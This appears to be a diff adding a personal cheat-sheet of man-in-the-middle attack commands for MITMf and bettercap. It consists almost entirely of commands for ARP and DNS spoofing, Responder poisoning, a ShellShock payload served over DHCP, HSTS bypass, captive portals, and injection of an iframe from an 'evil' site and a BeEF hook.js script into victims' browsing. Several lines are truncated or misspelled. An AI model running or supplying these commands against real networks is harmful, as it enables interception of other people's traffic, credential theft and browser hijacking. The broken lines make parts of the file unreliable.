@@ -1,0 +1,61 @@
+﻿mitmf --spoof --arp -i wlan0 --gateway 192.168.1.1 --target 192.168.1.4 --filepwn
+
+bettercap -X     valinerbitty
+
+bettercap -L        sniff
+
+
+python mitmf.py -i wlan0
+
+python mitmf.py -i enp3s0 --spoof --arp --gateway 192.
+
+python mitmf.py -i enp3s0 --spoof --arp --gateway 192.168.1.1 --responder --wpa
+
+python mitmf.py -i enp3s0 --spoof --arp --target 192.168.2.16-45,192.168.0.1/24 --gateway 192.168.1.1
+
+Enable DNS spoofing while ARP poisoning
+
+python mitmf.py -i enp3s0 --spoof --dns --arp --target 192.168.1.0/24 --gateway 192.168.1.1
+
+Enable LLMNR/NBTNS/MDNS spoofing:
+
+python mitmf.py -i enp3s0 --responder --wredir --nbtns
+
+python mitmf.py -i enp3s0 --spoof --dhcp
+
+Same as above with a ShellShock payload t
+
+python mitmf.py -i enp3s0 --spoof --dhcp --shellshock 'echo 0wn3d'
+
+Inject an HTML IFrame using the Inject plugin:
+
+python mitmf.py -i wlan0 --inject --html-url http://some-evil-website.com
+
+Inject a JS script:
+
+python mitmf.py -i enp3s0 --inject --js-url http://beef:3000/hook.js
+
+Start a captive portal that redirects everything to http://SERVER/PATH:
+
+python mitmf.py -i enp3s0 --spoof --arp --gateway 192.168.1.1 --captive --portalurl http://SERVER/PATH
+
+Start captive portal at http://your-ip/portal.html
+
+python mitmf.py -i enp3s0 --spoof --arp --gateway 192.168.1.1 --captive
+
+
+python mitmf.py -i enp3s0 --spoof --arp --gateway 192.168.1.1 --dns --captive --use-dns
+
+
+python mitmf.py -i enp3s0 --spoof --arp --gateway 192.168.1.1 --captive --portaldir LOCALDIR
+
+Same as above but with hostname:
+
+python mitmf.py -i enp3s0 --spoof --arp --gateway 192.168.1.1 --dns --captive --portaldir LOCALDIR --use-dns
+
+ mitmf.py --help
+
+mitmf --arp --spoof  -i wlan0 --geteway 192.168.43.1 --target 192.168.43.10 --hsts --inject --html-url http://www.facebook.com
+
+python mitmf.py --arp --spoof  -i wlan0 --geteway 192.168.43.1 --target 192.168.43.10 --hsts --inject --html-file /var/www/html/s.html
+
